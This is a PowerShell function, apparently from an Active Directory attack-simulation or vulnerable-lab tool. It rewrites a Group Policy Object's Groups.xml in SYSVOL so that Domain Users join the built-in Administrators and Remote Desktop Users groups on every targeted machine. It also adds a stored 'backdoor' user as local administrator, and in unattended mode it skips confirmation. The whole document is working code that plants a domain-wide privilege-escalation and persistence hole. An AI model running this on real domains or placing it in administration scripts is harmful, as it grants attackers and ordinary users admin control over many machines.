function Add-GPOMemberToBuiltinGroups {

    ################################################################################
    #####                                                                      ##### 
    #####      Add or Update members in Built-in Admin Groups                  #####                                 
    #####                                                                      #####
    ################################################################################

    Param(
        [string] $domainDNS,
        [string] $server,
        [string] $ID, 
        [String] $name
    )

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host ####################

    If (-not $SkipClearHost) { Clear-Host }

    Invoke-output -Type Header -Message "Add or Update Built-in Admin Group Members"
    Invoke-Output -Type TextMaker -Message "Affected GPO" -TM "'$name' {$ID}"
    
    If ($UnAttended) {
        $answer = $Script:Yes 
    }
    else {
        $answer = Show-DecisionPrompt
    }

    If ($answer -ne $Script:Yes) {
        Write-Log -Message "    >> Skipped!"
    }
    else {
        write-host
        [bool]$blocaladmins = $false
        [bool]$rdu = $false
        $xml = New-Object XML

        #define the target file
        $xmlFilePath = "\\$server\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences\Groups\Groups.xml"

        $temp = $Script:AllDomainsDetails | Where-Object { $_.DomainFQDN -match $domainDNS } | Select-Object DomainSID, NetBIOSName

        #define the new trustee, e.g. the domain users
        $Script:ASDomainSID = $temp.DomainSID
        $domainusersName = (Get-ADGroup -Filter * -Properties name -Server $domainDNS | Where-Object { ($_.SID -like "*-513") }).name
        $domainusersSID = $Script:ASDomainSID + "-513"
        $newtrustee = $temp.NetBIOSName + "\" + $domainusersName

        $GroupLocalAdmin = "Administrators (built-in)"
        $GroupRemoteDesktopUser = "Remote Desktop Users (built-in)"

        #first check for file .\Machine\Preferences\Groups\Groups.xml
        #and if needed create the file with a corresponding trustee
        If (!(Test-Path $xmlFilePath)) {

            New-Item -Name "Machine" -ItemType Directory -Path "\\$server\SYSVOL\$domainDNS\Policies\{$ID}" -ErrorAction Ignore | Out-Null
            New-Item -Name "Preferences" -ItemType Directory -Path "\\$server\SYSVOL\$domainDNS\Policies\{$ID}\Machine" -ErrorAction Ignore | Out-Null
            New-Item -Name "Groups" -ItemType Directory -Path "\\$server\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences" -ErrorAction Ignore | Out-Null
       
            Write-Log -Message "    >> created path: \\$server\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences\Groups\"

            # create core element 'Groups'
            $groupsElement = $xml.CreateElement("Groups")
            $groupsElement.SetAttribute("clsid", "{3125E937-EB16-4b4c-9934-544FC6D24D26}")
            $xml.AppendChild($groupsElement) | Out-Host
            $xml.Save($xmlFilePath)

            Add-GroupElementToFileGroupsXml -xmlFilePath $xmlFilePath -GroupName $GroupLocalAdmin -GroupSID "S-1-5-32-544"
        }
        else {
            Write-Log -Message "    >> found file: $xmlFilePath"
        }

        Set-gPCmachineExtensionNames -GPOGUID $ID -CSEGUID $Script:CSEGUIDLocalUaG -TOOLGUID $Script:ToolGUIDLocalUaG -Server $domainDNS
        Start-Sleep 1
            
        [xml]$xml = Get-Content $xmlFilePath
            
        # check if Administrators (built-in) exists
        $result = $xml.SelectSingleNode("//Group[@name='$GroupLocalAdmin']")
        if ($null -eq $result) { $blocaladmins = $false } else { $blocaladmins = $true }
        Write-Log -Message "    >> $GroupLocalAdmin exists: $blocaladmins"
            
        # check if Remote Desktop Users (built-in) exists
        $result = $xml.SelectSingleNode("//Group[@name='$GroupRemoteDesktopUser']")
        if ($null -eq $result) { $rdu = $false } else { $rdu = $true }
        Write-Log -Message "    >> $GroupRemoteDesktopUser exists: $rdu"

        If ($blocaladmins -eq $false) {
            Add-GroupElementToFileGroupsXml -xmlFilePath $xmlFilePath -GroupName $GroupLocalAdmin -GroupSID "S-1-5-32-544"
        }
        
        If ($rdu -eq $false) {
            Add-GroupElementToFileGroupsXml -xmlFilePath $xmlFilePath -GroupName $GroupRemoteDesktopUser -GroupSID "S-1-5-32-555"
        }
        write-host
        Add-TrusteeToFileGroupsXml -xmlFilePath $xmlFilePath -LocalGroup $GroupLocalAdmin -Trustee $newtrustee -SID $domainusersSID
        Add-TrusteeToFileGroupsXml -xmlFilePath $xmlFilePath -LocalGroup $GroupRemoteDesktopUser -Trustee $newtrustee -SID $domainusersSID

        $LatestBackdoorUser = Get-ASConfig -Setting "LastBDUser"
        If ($null -ne $LatestBackdoorUser) {
       
            $BDDomain = Get-BestDomainController -domain $LatestBackdoorUser
        
            try {
                $AdditionalUser = Get-ADUser -Identity $LatestBackdoorUser -Server $BDDomain -ErrorAction SilentlyContinue
            }
            catch {
                <#Do this if a terminating exception happens#>
            }
        
            If ($null -ne $AdditionalUser) {

                $CN = Convert-FromDNToCN -DistinguishedName $AdditionalUser.DistinguishedName
                $domainDNS = $CN.Split('/')[0] 

                $temp = $Script:AllDomainsDetails | Where-Object { $_.DomainFQDN -match $domainDNS } | Select-Object DomainSID, NetBIOSName
                $domain = $temp.NetBIOSName
                $newtrustee = $domain + "\" + $AdditionalUser.SamAccountName
                $domainusersSID = $AdditionalUser.SID
                Add-TrusteeToFileGroupsXml -xmlFilePath $xmlFilePath -LocalGroup $GroupLocalAdmin -Trustee $newtrustee -SID $domainusersSID
            }
        }
    }


    if (-not $UnAttended) { Pause }


    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}
